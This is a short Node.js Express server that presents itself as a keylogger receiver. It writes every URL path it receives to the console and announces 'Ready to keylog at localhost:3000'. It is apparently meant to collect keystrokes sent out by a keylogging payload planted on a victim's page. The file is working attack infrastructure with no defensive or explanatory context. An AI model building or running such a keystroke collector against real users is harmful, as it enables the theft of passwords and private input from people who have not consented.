const express = require("express");
const app = express();

app.get("/:key", (req, res) => {
  process.stdout.write(req.params.key);
  return res.sendStatus(400);
});

app.listen(3000, () => console.log("> Ready to keylog at localhost:3000"));
